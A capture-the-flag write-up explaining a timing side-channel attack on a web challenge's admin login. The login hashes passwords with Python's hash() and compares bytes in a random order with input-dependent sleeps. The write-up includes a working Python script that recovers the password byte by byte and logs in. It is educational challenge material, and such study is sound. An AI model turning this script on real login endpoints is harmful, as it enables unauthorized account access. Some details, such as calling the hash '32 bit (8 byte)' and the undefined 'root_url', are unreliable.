# Clock Fixing Sawyer

We are given a web app where we are tasked with logging in to the administrator account `admin`.

The password of the account is randomly generated at startup with a cryptographically secure random number generator (`secrets` module in Python),

```python
ADMIN_PASS = password_hash(secrets.token_urlsafe())
```

and the password is hashed using a shady home-made method

```python
def password_hash(pw):
    # Use python's inbuilt hash function for efficiency and other nice
    # properties
    return (hash(pw)).to_bytes(8, 'big', signed=True)[1:]
```

that essentially uses the built-in python `hash` function, which returns a 32
bit integer (8 byte), and uses the last 7 bytes from that result (big endian).

When logging in, the username and password is received as JSON

```python
@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.get_json() or {}
    username = data.get('username')
    password = data.get('password')

    if not (username and password):
        return {'error': 'Username or password missing', 'success': False}, 400

    if username != 'admin':
        return {'error': 'Unknown user', 'success': False}, 400

    if secure_hash_comparison(ADMIN_PASS, password_hash(password)):
        resp = make_response({'success': True})
        sess = secrets.token_urlsafe()
        resp.set_cookie(SESSION_COOKIE_NAME, sess)
        SESSIONS[sess] = {'username': 'admin'}
        return resp

    return {'error': 'Incorrect password', 'success': False}, 400
```

and the provided password is compared to `ADMIN_PASS` using the "secure" hash comparison

```python
PIN_ORDER = list(range(7))
sr = secrets.SystemRandom()
sr.shuffle(PIN_ORDER)

...

def secure_hash_comparison(h1, h2):
    '''
    Securely compares two byte hashes, h1 and h2.

    The comparison is done in a random order. If mismatch is found, random
    sleep is introduced. These two factors should mitigate against side-channel
    attacks and brute force attacks.
    '''
    for index in PIN_ORDER:
        if h1[index] != h2[index]:
            time.sleep(math.ceil(h2[index] / 150) / 10)
            return False
    return True
```

The secure hash comparison is performed as follows.

* On startup, a random order for the 7 bytes is chosen and stored in `PIN_ORDER`
* When a user provided hash is received for comparison
    * We walk through the bytes of the hash in the order of indices dictated by `PIN_ORDER`
    * We compare byte value at index
        * If it is correct, we continue
        * If it's not, we sleep for an amount of time determined by the second hash parameter, which happens to be the user supplied hash in our case.
        * Note
            * If the wrong hash value is 0, we sleep 0 seconds
            * If the wrong hash value is less than or equal to 150, we sleep for 0.1 seconds
            * If the wrong hash value is greater than 150, we sleep for 0.2 seconds

It looks like we might possibly be able to use some sort of attack on the secure hash comparison, but we must first determine how we can consistently control the hashed value of our provided password.

The built-in Python `hash` function is essentially random for strings in the sense that it is difficult to find a *preimage* of a hash (i.e., given a hash, finding a string that that has that hash value). However, finding a preimage of an integer for the `hash` function is trivial, since `hash(n) == n` for all 32 bit signed integers `n`. And, since the password is parsed as JSON, we can supply an integer instead of a string to the login endpoint.

Now that we can control the hash value, we must consider what type of attack we can perform. A brute-force attack is not feasible, since it would require testing 256^7 possible hashes. However, since the secure hash comparison involves sleep that is dependent on user input, we can utilize a side-channel attack.

The first thing we must determine is the `PIN_ORDER`, i.e., the order in which hash indices are compared. We note that if the hash contains only 0 bytes, the password comparison will (almost certainly) fail, but no sleep will occur. Therefore, if we construct an integer that has a 0 byte in all positions except the first and send that as a password, we will get one of two outcomes: either the response is instant, indicating that the first position is not first in `PIN_ORDER`; or the response is delayed, indicating that the first position is first in `PIN_ORDER`. We can then send an integer with 0 in all byte positions, except the second, third, etc. The slowest response will then reveal which position is first in `PIN_ORDER`.

Now we have determined a method for finding the first position in `PIN_ORDER`. Let's assume we have determined that the first index in `PIN_ORDER` is *k*. Now, we can brute force the value of the *k*-th byte, by sending an integer consisting of 0 in all byte positions, except the *k*-th, and incrementing the *k*-th byte from 1 to 255. The fastest response will reveal the byte in position *k* (if all responses are "slow", then it is possible that the byte value at index *k* is 0, but this case is very unlikely).

Now that we have determined the first correct byte, according to `PIN_ORDER`, we can use the same method as before to find the next index in `PIN_ORDER` by constructing an integer with 0 in all positions, except the *k*-th, where we place the correct byte. We then, in turn, replace each 0 with a 1 and attempt a login with that integer. The slowest of those responses, reveals the next index in `PIN_ORDER`. We can then repeat the process of incrementing just that byte from 1 to 255 and finding the fastest response, thus determining the next correct byte according to `PIN_ORDER`. This process can than be repeated until we have brute-forced each byte individually, which should take at most ~2000 (7*255) requests (but on average, much less than that).

```python
HASH = 7 * [0]
PICKED = 7 * [False]

url = 'https://cfs.ggc.tf/api/login'

def find_binding():
    for i in range(7):
        if PICKED[i]:
            continue

        test = HASH[:i] + [0xFF] + HASH[i+1:]
        pw = int.from_bytes(test, 'big')
        resp = requests.post(url, json={'username': 'admin', 'password': pw})
        print(resp.elapsed.microseconds)
        if resp.elapsed.microseconds > 350000:
            return i

def pick(i):
    for b in range(1, 256):
        test = HASH[:i] + [b] + HASH[i+1:]
        pw = int.from_bytes(test, 'big')
        resp = requests.post(url, json={'username': 'admin', 'password': pw})
        print(resp.elapsed.microseconds)
        if resp.elapsed.microseconds < 350001:
            print('Response in', resp.elapsed.microseconds)
            HASH[i] = b
            print(f'Click out of {i} at {b}')
            break
    else:
        print('Giving up, assuming pin is set at 0')
        HASH[i] = 0

    PICKED[i] = True



for _ in range(7):
    b = find_binding()
    print(b, 'is binding')
    pick(b)
    print(HASH)
    print(PICKED)

pw = int.from_bytes(HASH, 'big')
print('Password is', pw)
session = requests.Session()
session.post(url, json={'username': 'admin', 'password': pw})
resp = session.get(root_url)
```

This challenge was designed to mimic the method of single pin picking a physical pin tumbler lock (the challenge name is a nod to the YouTuber lock picking lawyer). Single pin picking involves applying rotational force to the lock cylinder and pushing the pins of the lock upwards, until a pin is found that is "binding" (i.e., rubbing up against the housing). That key pin is then pushed up to the shear line, in which case it is considered picked. After that, another pin should be binding. The process in the repeated to determine the position of that pin and it is then pushed up to shear line. The process is repeated for all remaining pins in the lock.
